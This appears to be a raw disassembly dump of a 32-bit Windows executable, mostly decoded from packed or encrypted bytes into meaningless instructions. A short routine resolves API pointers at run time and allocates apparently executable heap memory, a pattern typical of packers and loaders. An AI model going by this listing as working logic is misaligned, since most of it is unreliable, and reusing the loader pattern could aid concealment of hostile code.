  402079:	ror    esp,0x9
  40207c:	inc    DWORD PTR [eax]
  40207e:	nop
  40207f:	mov    DWORD PTR [edx],edi
  402081:	mov    dh,0x0
  402083:	add    bh,bh
  402085:	dec    ecx
  402086:	mov    DWORD PTR [edx+0x62de57ff],ecx
  40208c:	inc    DWORD PTR [eax]
  40208e:	sbb    eax,0x832972ff
  402093:	inc    DWORD PTR [eax]
  402095:	mov    al,ds:0x96cc5c00
  40209a:	lea    ecx,[ecx]
  40209c:	mov    DWORD PTR [eax],eax
  40209e:	scas   eax,DWORD PTR es:[edi]
  40209f:	int3   
  4020a0:	pushf  
  4020a1:	xor    edi,edi
  4020a3:	inc    DWORD PTR [eax]
  4020a5:	fmul   st,st(4)
  4020a7:	nop
  4020a8:	(bad)  
  4020a9:	fsub   QWORD PTR [esi-0x1b]
  4020ac:	cmp    edi,0x6b
  4020af:	and    DWORD PTR [esi+0xffcb],0xffffff8f
  4020b6:	dec    DWORD PTR [ecx]
  4020b8:	add    BYTE PTR [edx-0x7c768675],cl
  4020be:	adc    al,0xff
  4020c0:	sbb    BYTE PTR [edi-0x60ffff7d],al
  4020c6:	add    BYTE PTR [esi-0x118f77],cl
  4020cc:	add    BYTE PTR [ebx+0x45e6ff31],al
  4020d2:	(bad)  
  4020d3:	(bad)  
  4020d4:	call   DWORD PTR [edi+edi*8-0x65]
  4020d8:	(bad)  
  4020d9:	cli    
  4020da:	adc    ecx,esp
  4020dc:	(bad)  
  4020dd:	dec    DWORD PTR [ebx+0x0]
  4020e0:	jl     0x40206c
  4020e2:	add    BYTE PTR [eax],al
  4020e4:	add    dl,bl
  4020e6:	xor    DWORD PTR [ebx-0x77],0x67
  4020ea:	xchg   DWORD PTR [edi],edx
  4020ec:	inc    DWORD PTR [eax]
  4020ee:	in     al,0x89
  4020f0:	pop    ebx
  4020f1:	data16 (bad) 
  4020f3:	inc    DWORD PTR [eax]
  4020f5:	loope  0x4020f6
  4020f7:	leave  
  4020f8:	inc    DWORD PTR [esi+eiz*4-0x61]
  4020fc:	inc    DWORD PTR [eax]
  4020fe:	pop    esp
  4020ff:	call   FWORD PTR [esi]
  402101:	push   eax
  402102:	dec    DWORD PTR [ecx-0x77006a00]
  402108:	jmp    DWORD PTR [esi-0xa0f1]
  40210e:	sti    
  40210f:	call   esi
  402111:	dec    edx
  402112:	inc    DWORD PTR [eax]
  402114:	add    BYTE PTR [edi],ch
  402116:	jmp    DWORD PTR [ebx]
  402118:	jmp    FWORD PTR [eax+edx*8]
  40211b:	jp     0x40211c
  40211d:	call   DWORD PTR [ebx+0x0]
  402120:	mov    ebx,DWORD PTR [edi-0x7d]
  402123:	mov    DWORD PTR [ebx-0xed00e5],eax
  402129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40212a:	jmp    0x4021ab
  40212c:	add    DWORD PTR [eax],0x11
  40212f:	add    dl,bl
  402131:	pushf  
  402132:	add    BYTE PTR [eax],al
  402134:	add    BYTE PTR [edx+0x0],ah
  402137:	cs add al,bl
  40213a:	xor    eax,0x4a008334
  40213f:	add    BYTE PTR [edx-0x54],ah
  402142:	cmp    edi,0xffffffff
  402145:	in     al,0xff
  402147:	xchg   edx,eax
  402148:	add    dh,dh
  40214a:	iret   
  40214b:	or     al,0xff
  40214d:	add    BYTE PTR [ecx],dl
  40214f:	add    DWORD PTR [ecx],0x23
  402152:	(bad)  
  402153:	(bad)  
  402154:	(bad)  
  402155:	fxch   st(4)
  402157:	push   0xffffffff
  402159:	in     al,dx
  40215a:	dec    edi
  40215b:	xor    al,0xff
  40215d:	jmp    DWORD PTR [ebp-0xb54901]
  402163:	inc    DWORD PTR [ebx-0x6e7c1b]
  402169:	mov    al,0x83
  40216b:	sahf   
  40216c:	(bad)  
  40216d:	call   DWORD PTR [ebp-0x1]
  402170:	popf   
  402171:	pop    ebp
  402172:	int3   
  402173:	or     DWORD PTR [ecx-0x7c1833ae],0x28
  40217a:	xor    bl,0xff
  40217d:	add    al,dl
  40217f:	jmp    DWORD PTR [ecx+0x6c]
  402182:	add    bh,bh
  402184:	or     DWORD PTR [esi-0x1],0xfffffff2
  402188:	inc    DWORD PTR [ebx+0xff00cd]
  40218e:	xchg   ecx,eax
  40218f:	call   FWORD PTR [edx]
  402191:	pop    esi
  402192:	int3   
  402193:	add    bh,bh
  402195:	or     bh,bh
  402197:	outs   dx,BYTE PTR ds:[esi]
  402198:	push   DWORD PTR [edx+esi*2+0x5a0083a6]
  40219f:	inc    DWORD PTR [eax+esi*1]
  4021a2:	add    BYTE PTR [eax],al
  4021a4:	int3   
  4021a5:	enter  0x6589,0xff
  4021a9:	imul   esp,DWORD PTR [ecx+eiz*1-0x8eff77],0x71
  4021b1:	in     eax,0xff
  4021b3:	(bad)  
  4021b4:	jmp    ecx
  4021b6:	mov    ecx,ebx
  4021b8:	add    BYTE PTR [edi-0x7c4c8e],bl
  4021be:	or     bh,bh
  4021c0:	shl    DWORD PTR [esi-0x47ffff34],0xff
  4021c7:	pop    eax
  4021c8:	sub    DWORD PTR [ebp-0x76000922],0xffffff9e
  4021cf:	dec    DWORD PTR [ebx+eax*2+0x3ffcc83]
  4021d6:	adc    DWORD PTR [edi-0x20498634],0xffffff83
  4021dd:	jmp    DWORD PTR [edi-0x1]
  4021e0:	ja     0x4021f4
  4021e2:	add    bh,bh
  4021e4:	or     DWORD PTR [edi+edi*8-0x221dffd7],0xffffff90
  4021ec:	int3   
  4021ed:	add    BYTE PTR [ebx],al
  4021ef:	dec    DWORD PTR [ebx-0xff00e3]
  4021f5:	push   cs
  4021f6:	add    ah,bl
  4021f8:	add    bl,dh
  4021fa:	addr16 fwait
  4021fc:	inc    DWORD PTR [eax]
  4021fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ff:	mov    DWORD PTR [ebx],eax
  402201:	enter  0xff,0xff
  402205:	xchg   ebx,eax
  402206:	sub    ecx,0x0
  402209:	mov    ah,0x47
  40220b:	outs   dx,BYTE PTR ds:[esi]
  40220c:	dec    DWORD PTR [ecx+0x6697ff2a]
  402212:	add    bh,bh
  402214:	add    BYTE PTR [ebx-0x1],bl
  402217:	int    0xff
  402219:	or     al,0x90
  40221b:	jg     0x40221c
  40221d:	add    BYTE PTR [ebx-0x34],ah
  402220:	or     DWORD PTR [esi-0x33003400],esi
  402226:	cmp    DWORD PTR [eax],0x0
  402229:	(bad)  
  40222a:	out    0x8d,eax
  40222c:	add    bh,bh
  40222e:	xor    eax,0x3c0889
  402233:	mov    DWORD PTR [ebx-0x75ff5b],eax
  402239:	and    al,BYTE PTR [ecx+0x43ccffa4]
  40223f:	add    dl,ch
  402241:	addr16 (bad) 
  402243:	(bad)  
  402244:	push   DWORD PTR [eax]
  402246:	jmp    FWORD PTR [ebp+0x4f2d3100]
  40224c:	add    bh,bh
  40224e:	das    
  40224f:	jmp    esi
  402251:	mov    ?,edi
  402253:	inc    DWORD PTR [eax]
  402255:	in     al,dx
  402256:	call   ebx
  402258:	dec    DWORD PTR [ebx-0x7e]
  40225b:	aas    
  40225c:	mov    DWORD PTR [ebx-0x19d500b6],eax
  402262:	(bad)  
  402263:	(bad)  
  402264:	jmp    DWORD PTR [esi-0x1]
  402267:	add    BYTE PTR ds:[esi+ebp*2-0x45007c54],dh
  40226f:	add    BYTE PTR [esi+ebx*8],cl
  402272:	(bad)  
  402273:	inc    DWORD PTR [eax]
  402275:	and    edi,edi
  402277:	out    0x83,al
  402279:	or     DWORD PTR [ebx],edi
  40227b:	jbe    0x402206
  40227d:	add    BYTE PTR [eax],ah
  40227f:	call   FWORD PTR [ecx]
  402281:	(bad)  
  402282:	inc    DWORD PTR [eax]
  402284:	dec    DWORD PTR [esi+0x4a00becc]
  40228a:	in     al,0x5f
  40228c:	add    BYTE PTR [ebx-0x6c2b0085],al
  402292:	inc    DWORD PTR [eax]
  402294:	push   DWORD PTR [eax-0x1]
  402297:	cmc    
  402298:	or     DWORD PTR [ecx+0x6c],0x1c
  40229c:	int3   
  40229d:	add    bh,cl
  40229f:	call   DWORD PTR [esi]
  4022a1:	push   ecx
  4022a2:	inc    DWORD PTR [eax]
  4022a4:	int3   
  4022a5:	cmp    DWORD PTR [eax],eax
  4022a7:	add    BYTE PTR ss:[edi+ebx*4+0xfff00f7],al
  4022af:	inc    DWORD PTR [ecx+0x6c]
  4022b2:	add    BYTE PTR [eax],al
  4022b4:	(bad)  
  4022b5:	cli    
  4022b6:	xor    DWORD PTR [ecx+0x2211d683],0x0
  4022bd:	xor    DWORD PTR [edx],0xffffffff
  4022c0:	jns    0x4022f4
  4022c2:	(bad)  
  4022c3:	inc    DWORD PTR [eax]
  4022c5:	sbb    DWORD PTR [ebx-0x698d000d],eax
  4022cb:	pop    esi
  4022cc:	add    BYTE PTR [eax],al
  4022ce:	pop    es
  4022cf:	mov    DWORD PTR [edx+ecx*4+0x0],edx
  4022d3:	(bad)  
  4022d4:	dec    DWORD PTR [eax+0x4bffde83]
  4022da:	mov    WORD PTR [esi],fs
  4022dc:	or     esp,0xffffff8f
  4022df:	(bad)  
  4022e0:	(bad)  
  4022e2:	add    DWORD PTR [ebx+0x42ff13ff],0xffffffff
  4022e9:	dec    edi
  4022ea:	enter  0x1f,0xcc
  4022ee:	mov    bh,bh
  4022f0:	out    dx,al
  4022f1:	pop    ebp
  4022f2:	inc    DWORD PTR [ebx+0x26830b00]
  4022f8:	jmp    FWORD PTR [ebp+0x75]
  4022fb:	fcmovne st,st(4)
  4022fd:	add    dh,dh
  4022ff:	jmp    DWORD PTR [esi-0xff769e]
  402305:	dec    eax
  402306:	jmp    ebp
  402308:	add    BYTE PTR [eax+0xff3c01],ch
  40230e:	adc    edi,edi
  402310:	sbb    eax,0xffff00ec
  402315:	retf   0x8b00
  402318:	add    BYTE PTR [esi-0x69],bh
  40231b:	sub    eax,DWORD PTR [ebx-0x1dffa901]
  402321:	inc    ebp
  402322:	int3   
  402323:	dec    esp
  402325:	and    bh,bh
  402327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402328:	and    DWORD PTR [ebx-0xffa604],0x2f
  40232f:	jmp    FWORD PTR [ebx-0x47]
  402332:	inc    DWORD PTR [ebx+0x56002089]
  402338:	dec    DWORD PTR [ebp+0x23]
  40233b:	sti    
  40233c:	add    BYTE PTR [eax],al
  40233e:	sar    bh,1
  402340:	cwde   
  402341:	dec    esp
  402342:	add    bh,bh
  402344:	(bad)  
  402345:	mov    ecx,0x8b00ef00
  40234a:	out    0x0,al
  40234c:	add    bh,bh
  40234e:	in     eax,0x0
  402350:	(bad)  
  402351:	xlat   BYTE PTR ds:[ebx]
  402352:	(bad)  
  402353:	(bad)  
  402354:	dec    DWORD PTR [edi+edi*8-0x12]
  402358:	dec    esi
  40235a:	or     ah,BYTE PTR [edi]
  40235c:	mov    DWORD PTR [eax],eax
  40235e:	mov    esp,cs
  402360:	mov    edx,0x83ccffd5
  402365:	sti    
  402366:	call   DWORD PTR [eax]
  402368:	add    BYTE PTR [edx-0x7c00a1c7],dh
  40236e:	repz dec ebx
  402371:	jmp    0x402372
  402373:	dec    DWORD PTR [ecx+0x72ffeb]
  402379:	mov    edx,0x8a24
  40237e:	enter  0x4400,0x4e
  402382:	add    bh,bh
  402384:	add    BYTE PTR [edi+edi*8+0x26],al
  402388:	push   ebx
  40238a:	dec    edx
  40238b:	dec    ebp
  40238c:	(bad)  
  40238d:	call   DWORD PTR [ebp+0xbfbdff]
  402393:	dec    DWORD PTR [ecx-0x420023]
  402399:	(bad)  
  40239a:	fst    DWORD PTR [ebx]
  40239c:	add    BYTE PTR [eax],al
  40239e:	xor    bh,bh
  4023a0:	fnsave [ebp-0x2b76007d]
  4023a6:	add    BYTE PTR [ebx-0x4384ae01],dh
  4023ac:	mov    edi,edi
  4023ae:	ret    
  4023af:	add    DWORD PTR [ecx],0x79
  4023b2:	inc    DWORD PTR [eax]
  4023b4:	push   DWORD PTR [ecx-0x5dff8601]
  4023ba:	daa    
  4023bb:	test   al,0xff
  4023bd:	add    BYTE PTR [edi+edi*8-0x3300b65e],ch
  4023c4:	push   DWORD PTR [edx-0x7d]
  4023c7:	dec    ebp
  4023c8:	(bad)  
  4023c9:	(bad)  
  4023ca:	jecxz  0x4023ef
  4023cc:	mov    DWORD PTR [eax],eax
  4023ce:	push   edi
  4023cf:	int3   
  4023d0:	aas    
  4023d1:	jb     0x4023d2
  4023d3:	add    DWORD PTR [eax],0x78
  4023d6:	add    ah,bh
  4023d8:	push   DWORD PTR [ebx-0x7c7cf321]
  4023de:	mov    edi,?
  4023e0:	stos   DWORD PTR es:[edi],eax
  4023e1:	and    bh,bh
  4023e3:	add    BYTE PTR [eax],al
  4023e5:	mov    al,0xff
  4023e7:	jns    0xffef238b
  4023ed:	add    DWORD PTR [eax+eax*1],0x13
  4023f1:	pop    eax
  4023f2:	add    bh,bh
  4023f4:	sbb    DWORD PTR [edx],0xffffff89
  4023f7:	sbb    DWORD PTR [ebx-0x7c8f1eb5],eax
  4023fd:	add    BYTE PTR [ebp-0x1],ah
  402400:	int    0x3c
  402402:	inc    DWORD PTR [eax]
  402404:	mov    DWORD PTR [esi],ebp
  402406:	(bad)  
  402407:	mov    edx,0xe46407cc
  40240c:	(bad)  
  40240d:	inc    ebx
  40240f:	add    BYTE PTR ds:0xffffff24,cl
  402415:	or     eax,DWORD PTR [eax]
  402417:	sub    bh,bh
  402419:	loopne 0x402424
  40241b:	icebp  
  40241c:	inc    DWORD PTR [eax]
  40241e:	lahf   
  40241f:	dec    DWORD PTR [ecx]
  402421:	pop    edi
  402422:	cmp    edi,0xffffffff
  402425:	cs (bad) 
  402427:	jmp    0xcc:0x799fefcc
  40242e:	xor    edi,edi
  402430:	std    
  402431:	icebp  
  402432:	inc    DWORD PTR [eax]
  402434:	mov    DWORD PTR [eax+eax*1-0x735a0098],eax
  40243b:	inc    esi
  40243c:	(bad)  
  40243d:	jmp    DWORD PTR [esi-0x1]
  402440:	inc    edi
  402441:	addr16 (bad) 
  402443:	inc    DWORD PTR [eax]
  402445:	mov    ch,0x0
  402447:	jns    0x402449
  402449:	push   es
  40244a:	test   al,0x48
  40244c:	inc    DWORD PTR [eax]
  40244e:	test   bh,bh
  402450:	push   ecx
  402451:	aad    0x83
  402453:	add    bh,bh
  402455:	add    eax,DWORD PTR [eax]
  402457:	loope  0x402425
  402459:	mov    cl,0x38
  40245b:	add    DWORD PTR [eax],0x0
  40245e:	inc    DWORD PTR [ebx+0xb834]
  402464:	and    edx,0xffffffff
  402467:	sar    edi,1
  402469:	repz and eax,DWORD PTR [bx+si]
  40246d:	(bad)  
  40246e:	mov    edi,0x833c3eff
  402473:	dec    DWORD PTR [ecx-0x10ffec]
  402479:	jae    0x40245c
  40247b:	and    edi,edi
  40247d:	(bad)  
  40247e:	clc    
  40247f:	add    ah,al
  402481:	add    eax,0x6f830000
  402486:	add    BYTE PTR [edi+0x41aeffff],bh
  40248c:	dec    esp
  40248e:	jp     0x402490
  402490:	cmp    BYTE PTR [esi+0xc830000],bh
  402496:	add    cl,dh
  402498:	(bad)  
  402499:	cmp    eax,0xffffd24c
  40249e:	jne    0x40249f
  4024a0:	jg     0x40251f
  4024a2:	dec    esp
  4024a4:	mov    edi,ecx
  4024a6:	inc    DWORD PTR [esi]
  4024a8:	add    BYTE PTR [ecx+edi*4],ch
  4024ab:	retf   0xff83
  4024ae:	cld    
  4024af:	add    BYTE PTR [ebx-0xff002c],bh
  4024b5:	inc    esp
  4024b6:	call   DWORD PTR [eax+eax*1-0x690d17]
  4024bd:	or     DWORD PTR [ebp-0x7d],0xffffff8b
  4024c1:	loopne 0x4024c3
  4024c3:	add    BYTE PTR [ebx-0x33220014],al
  4024c9:	or     eax,DWORD PTR [ecx+0x7a]
  4024cc:	add    bh,bh
  4024ce:	repz jmp DWORD PTR ds:0xff008319
  4024d5:	xlat   BYTE PTR ds:[ebx]
  4024d6:	add    ah,dh
  4024d8:	(bad)  
  4024d9:	fisubr WORD PTR [edi+0x25ff00b2]
  4024df:	(bad)  
  4024e0:	fstp   DWORD PTR [edi+0x63ff00ff]
  4024e6:	sub    ebx,0xffffff83
  4024e9:	xchg   esi,eax
  4024ea:	je     0x402515
  4024ec:	inc    DWORD PTR [ebx-0x57a50042]
  4024f2:	(bad)  
  4024f3:	inc    DWORD PTR [ebx-0x50334b]
  4024f9:	cmp    edi,0xb200ff0d
  4024ff:	inc    ecx
  402501:	pop    ss
  402502:	add    BYTE PTR [ebx+0x7183c3ff],al
  402508:	int3   
  402509:	sahf   
  40250a:	shr    BYTE PTR [ecx],1
  40250c:	add    DWORD PTR [eax],0x6b
  40250f:	mov    DWORD PTR [edx],ecx
  402511:	out    dx,al
  402512:	add    DWORD PTR [eax],0xffffffff
  402515:	mov    esi,0x37ff7eff
  40251a:	xor    DWORD PTR [ebx],edi
  40251c:	add    bh,bh
  40251e:	icebp  
  40251f:	mov    ebp,eax
  402521:	mov    dh,0x83
  402523:	add    BYTE PTR [ecx-0x33a5001b],cl
  402529:	int3   
  40252a:	jp     0x402525
  40252c:	(bad)  
  40252d:	push   DWORD PTR [esi+0x9941ff]
  402533:	add    BYTE PTR [eax],al
  402535:	(bad)  
  402536:	add    BYTE PTR [ebx+eax*4],ch
  402539:	fisub  DWORD PTR [esi]
  40253b:	pop    es
  40253c:	(bad)  
  40253d:	(bad)  
  40253e:	call   0x3beb42
  402543:	dec    DWORD PTR [ecx+0xeff73]
  402549:	or     al,0x50
  40254b:	aas    
  40254c:	add    BYTE PTR [ebx+0x5f80892b],al
  402552:	add    BYTE PTR [eax],al
  402554:	and    DWORD PTR [ebx-0x1],0x47
  402558:	add    BYTE PTR [ebp-0x43],bl
  40255b:	enter  0x8300,0xe0
  40255f:	add    BYTE PTR [edx-0x18],bh
  402565:	adc    ah,cl
  402567:	add    BYTE PTR [eax],al
  402569:	dec    ebp
  40256a:	ud2    
  40256c:	cmp    edi,0x42
  40256f:	(bad)  
  402570:	std    
  402571:	pop    ebp
  402572:	mov    edi,edi
  402574:	inc    DWORD PTR [edi+edi*8-0xd]
  402578:	int3   
  402579:	or     DWORD PTR [esi-0x1c],0x0
  40257d:	add    al,bl
  40257f:	inc    DWORD PTR [edx-0xff002d]
  402585:	(bad)  
  402586:	jmp    FWORD PTR [eax+eax*1]
  402589:	push   esi
  40258a:	jne    0x4025f7
  40258c:	dec    esp
  40258e:	cli    
  40258f:	sub    DWORD PTR [edi+eax*8],0x0
  402593:	dec    DWORD PTR [ecx-0x810086]
  402599:	cmc    
  40259a:	fsub   DWORD PTR [ebx+eax*4]
  40259d:	push   DWORD PTR [ecx]
  40259f:	(bad)  
  4025a0:	jns    0x40253d
  4025a2:	add    bh,bh
  4025a4:	add    BYTE PTR [ebp-0x7433d101],ch
  4025aa:	ja     0x40259a
  4025ac:	add    bh,bh
  4025ae:	inc    ebp
  4025af:	add    cl,ch
  4025b1:	mov    eax,ds:0x1fff0000
  4025b6:	mov    DWORD PTR [ecx],ecx
  4025b8:	jmp    DWORD PTR [eax]
  4025ba:	cmp    dh,BYTE PTR [eax+eax*1-0x1]
  4025be:	dec    ecx
  4025bf:	add    BYTE PTR [esi+0x74],al
  4025c2:	(bad)  
  4025c3:	inc    DWORD PTR [eax]
  4025c5:	pop    esi
  4025c6:	dec    DWORD PTR [eax+eax*1]
  4025c9:	in     al,dx
  4025ca:	retf   0xcce9
  4025cd:	inc    ebx
  4025cf:	sub    DWORD PTR [eax-0x3b],0xffffffff
  4025d3:	add    bh,bh
  4025d5:	stos   BYTE PTR es:[edi],al
  4025d6:	int3   
  4025d7:	push   eax
  4025d8:	jmp    DWORD PTR [eax-0x1f]
  4025db:	mov    ebx,0xcca2ff83
  4025e0:	imul   esi,DWORD PTR [ebx+0x200000ff],0xffffff83
  4025e7:	push   edx
  4025e8:	call   ecx
  4025ea:	mov    ch,0x10
  4025ec:	(bad)  
  4025ed:	jmp    FWORD PTR [eax-0x1]
  4025f0:	cs jmp 0x14ff:0x2300ff00
  4025f8:	jmp    FWORD PTR [edi+0xfff13d]
  4025fe:	inc    ebx
  4025ff:	jmp    DWORD PTR [esi]
  402601:	cmc    
  402602:	dec    esp
  402604:	call   FWORD PTR [edi]
  402606:	jmp    FWORD PTR [esi]
  402608:	mov    ecx,esp
  40260a:	das    
  40260b:	xor    eax,0x83aacc83
  402610:	pop    ebx
  402611:	out    0xff,al
  402613:	inc    DWORD PTR [eax]
  402615:	ret    0xbcc
  402618:	inc    DWORD PTR [esi-0xffd942]
  40261e:	fild   DWORD PTR [eax]
  402620:	pop    es
  402621:	and    al,BYTE PTR [eax]
  402623:	int3   
  402624:	mov    DWORD PTR [eax+0x0],edi
  402627:	jle    0x402629
  402629:	popa   
  40262a:	out    0xc6,al
  40262c:	add    bh,bh
  40262e:	inc    ecx
  40262f:	add    ch,bh
  402631:	rol    DWORD PTR [eax],0xff
  402634:	add    BYTE PTR [ecx],dl
  402636:	push   DWORD PTR [esi-0x1]
  402639:	mov    cl,0xec
  40263b:	std    
  40263c:	(bad)  
  40263d:	(bad)  
  40263e:	mov    edx,0xff6e8dcc
  402643:	(bad)  
  402644:	(bad)  
  402645:	cld    
  402646:	push   DWORD PTR ds:0x7bf47383
  40264c:	(bad)  
  40264d:	dec    DWORD PTR [ecx+0xea0600]
  402653:	add    bh,bh
  402655:	mov    cl,0x89
  402657:	add    DWORD PTR [ebx+0xf9eec5],0xffffffff
  40265e:	data16 add BYTE PTR [ecx+0x1d],ah
  402662:	(bad)  
  402663:	(bad)  
  402664:	call   DWORD PTR [esp+ecx*8+0x30]
  402668:	push   DWORD PTR [ebp+0x895156]
  40266e:	ins    BYTE PTR es:[edi],dx
  40266f:	add    BYTE PTR [esp+edi*4-0x1affff7d],al
  402676:	call   FWORD PTR [ebx]
  402678:	add    BYTE PTR [ecx-0x3300a9aa],ch
  40267e:	sub    WORD PTR [ebx+ecx*1-0x77],0x0
  402684:	push   ebx
  402686:	add    BYTE PTR [esi],ah
  402688:	add    BYTE PTR [edi+0x64],al
  40268b:	cmc    
  40268c:	cmp    edi,0x63
  40268f:	call   ebp
  402691:	fwait
  402692:	add    bh,bh
  402694:	mov    ecx,esp
  402696:	inc    DWORD PTR [edi+edi*8]
  402699:	aas    
  40269a:	mov    esp,0xd3ccffe1
  40269f:	(bad)  
  4026a0:	fmul   DWORD PTR [edi+0x6bff0000]
  4026a6:	jmp    DWORD PTR [esi]
  4026a8:	add    BYTE PTR [ebp+ebx*8+0x7a],cl
  4026ac:	dec    esp
  4026ae:	jne    0x4026b0
  4026b0:	push   ebx
  4026b2:	cwde   
  4026b3:	fcmovnu st,st(7)
  4026b5:	add    bl,ch
  4026b7:	outs   dx,DWORD PTR ds:[esi]
  4026b8:	cli    
  4026b9:	dec    DWORD PTR [ecx-0xff0058]
  4026bf:	dec    esp
  4026c1:	inc    edi
  4026c2:	add    BYTE PTR [edi+0x36],ch
  4026c5:	sub    eax,0x45
  4026c8:	mov    ch,0xff
  4026ca:	dec    DWORD PTR [eax]
  4026cc:	add    BYTE PTR [eax],al
  4026ce:	cmp    edi,0xffffffa1
  4026d1:	xor    BYTE PTR [eax+0x44],dl
  4026d4:	add    BYTE PTR [ebx+0x56],dl
  4026d7:	mov    ebx,0x1
  4026dc:	push   ebx
  4026dd:	push   0x444560
  4026e2:	mov    ds:0x449004,eax
  4026e7:	call   eax
  4026e9:	test   BYTE PTR ds:0x448d50,bl
  4026ef:	jne    0x402701
  4026f1:	mov    eax,ds:0x445034
  4026f6:	or     DWORD PTR ds:0x448d50,ebx
  4026fc:	mov    ds:0x449000,eax
  402701:	push   0x0
  402703:	push   0x54328
  402708:	push   0x40000
  40270d:	call   DWORD PTR ds:0x449000
  402713:	push   0x0
  402715:	push   0x0
  402717:	mov    esi,eax
  402719:	call   DWORD PTR ds:0x44506c
  40271f:	cmp    al,0x57
  402721:	jne    0x402758
  402723:	test   BYTE PTR ds:0x448d44,bl
  402729:	jne    0x402741
  40272b:	or     DWORD PTR ds:0x448d44,ebx
  402731:	push   0x447a40
  402736:	call   DWORD PTR ds:0x445038
  40273c:	mov    ds:0x448d40,eax
  402741:	mov    ecx,DWORD PTR ds:0x448d40
  402747:	push   0x447a34
  40274c:	push   ecx
  40274d:	call   DWORD PTR ds:0x44503c
  402753:	mov    ds:0x448d4c,eax
  402758:	push   0x54328
  40275d:	push   0x0
  40275f:	push   esi
  402760:	call   DWORD PTR ds:0x448d4c
  402766:	pop    esi
  402767:	mov    ds:0x448d20,eax
  40276c:	pop    ebx
  40276d:	ret    
  40276e:	int3   
  40276f:	int3   
  402770:	lds    eax,FWORD PTR [eax]
  402772:	mov    esi,eax
  402774:	add    bl,al
  402776:	nop
  402777:	add    BYTE PTR [edx],ch
  402779:	inc    DWORD PTR [eax]
  40277b:	add    eax,0xffaadeff
  402780:	aaa    
  402781:	add    DWORD PTR [eax],0x2a
  402784:	(bad)  
  402785:	mov    edi,0xff7e8928
  40278a:	(bad)  
  40278b:	cmp    al,BYTE PTR [eax]
  40278d:	jo     0x4027c0
  40278f:	mov    DWORD PTR [edx],esp
  402791:	inc    DWORD PTR [ebx-0xb8d00b0]
  402797:	(bad)  
  402798:	jmp    0x402799
  40279a:	(bad)  
  40279b:	jge    0x40279c
  40279d:	sbb    al,0xc2
  40279f:	(bad)  
  4027a0:	(bad)  
  4027a2:	add    BYTE PTR [esi-0xc37c01],ah
  4027a8:	mov    edx,0x838189ff
  4027ad:	test   eax,0xfff3ff9e
  4027b2:	int3   
  4027b3:	pop    edx
  4027b4:	add    BYTE PTR [edi+ecx*8-0x1],dl
  4027b8:	cmp    bh,0x83
  4027bb:	bnd jmp DWORD PTR ds:0xff9d8315
  4027c2:	xor    DWORD PTR [esi+0x9bbbff],0x4c
  4027c9:	cmp    edi,0x70
  4027cc:	push   DWORD PTR [ebx]
  4027ce:	dec    esp
  4027cf:	sbb    DWORD PTR [eax],0xffffffff
  4027d2:	mov    eax,ebx
  4027d4:	int3   
  4027d5:	nop
  4027d6:	cli    
  4027d7:	dec    edx
  4027d9:	add    BYTE PTR [eax],al
  4027db:	push   cs
  4027dc:	add    BYTE PTR [eax-0x33b900d4],dh
  4027e2:	call   FWORD PTR [edx+0xb87583]
  4027e8:	and    bh,bh
  4027ea:	(bad)  
  4027eb:	mov    esp,0xff93daff
  4027f0:	fld    QWORD PTR [ebx-0x28ff5001]
  4027f6:	popa   
  4027f7:	add    BYTE PTR [edx],ah
  4027f9:	add    DWORD PTR [eax],0x4f
  4027fc:	and    DWORD PTR [ecx],0xffffffea
  4027ff:	push   DWORD PTR [edi+edi*8-0x3d7c0501]
  402806:	mov    ecx,0xff0e83
  40280b:	in     eax,0x0
  40280d:	popf   
  40280e:	(bad)  
  40280f:	dec    DWORD PTR [ecx-0xe80001]
  402815:	cs xchg esi,eax
  402817:	(bad)  
  402818:	aas    
  402819:	add    BYTE PTR [ecx+0x5caeffd6],cl
  40281f:	mov    DWORD PTR [edx+0x2c83ff],ebx
  402825:	ss add BYTE PTR fs:[edx-0x7c47ff7d],bl
  40282d:	or     DWORD PTR [ebx],edx
  40282f:	jmp    DWORD PTR [esi-0x1]
  402832:	dec    DWORD PTR [edi+edi*8-0x5bffb981]
  402839:	dec    esp
  40283b:	std    
  40283c:	int3   
  40283d:	addr16 jmp 0xc9fe43
  402843:	sbb    eax,DWORD PTR [ebx+0xe007ba3]
  402849:	add    BYTE PTR [eax],al
  40284b:	inc    esp
  40284c:	jmp    DWORD PTR [esi+0x63]
  40284f:	(bad)  
  402850:	jge    0x402851
  402852:	(bad)  
  402853:	cmp    DWORD PTR [ecx-0x1e007408],ecx
  402859:	inc    DWORD PTR [eax]
  40285b:	iret   
  40285c:	call   DWORD PTR [edx]
  40285e:	icebp  
  40285f:	mov    DWORD PTR [esp+ecx*8-0x1],eax
  402863:	cmc    
  402864:	dec    DWORD PTR [edx]
  402866:	add    DWORD PTR gs:[ebx+0x0],0x0
  40286b:	inc    ecx
  40286c:	jmp    DWORD PTR [ebx]
  40286e:	idiv   edi
  402870:	mov    ebx,0xffb8ffff
  402875:	jb     0x402808
  402877:	add    BYTE PTR [ebx-0x7d],dh
  40287a:	mov    DWORD PTR [ecx+0x1c19ff],esp
  402880:	ins    BYTE PTR es:[edi],dx
  402881:	(bad)  
  402882:	push   DWORD PTR [edi-0x7c3d887d]
  402888:	daa    
  402889:	inc    DWORD PTR [ebx-0x602f33f9]
  40288f:	push   ebx
  402891:	int3   
  402892:	(bad)  
  402893:	fiadd  DWORD PTR [eax]
  402895:	adc    al,0x4a
  402897:	add    BYTE PTR [edx+0xfffff],cl
  40289d:	sbb    BYTE PTR [ebp-0xef00],dh
  4028a3:	jmp    FWORD PTR gs:[edx]
  4028a6:	test   edi,edi
  4028a8:	scas   al,BYTE PTR es:[edi]
  4028a9:	add    ah,cl
  4028ab:	pushf  
  4028ac:	jmp    DWORD PTR [ebx-0x987cdc]
  4028b2:	sbb    DWORD PTR [ecx-0xb6b900],0x69
  4028b9:	int3   
  4028ba:	jmp    DWORD PTR [ebx-0x3e2c00]
  4028c0:	sub    ah,cl
  4028c2:	(bad)  
  4028c3:	cld    
  4028c4:	add    BYTE PTR [edi+0xe8fff9],al
  4028ca:	push   esp
  4028cc:	sbb    DWORD PTR [eax],0xfffffff4
  4028cf:	add    BYTE PTR [edi-0x33d97c01],cl
  4028d5:	int3   
  4028d6:	imul   eax,DWORD PTR [eax],0x4b
  4028d9:	add    BYTE PTR [ecx+0x4c208933],cl
  4028df:	(bad)  
  4028e0:	mov    ebp,0x5200ff
  4028e5:	pop    ebx
  4028e6:	jbe    0x4028e8
  4028e8:	dec    edi
  4028e9:	add    bh,bh
  4028eb:	pusha  
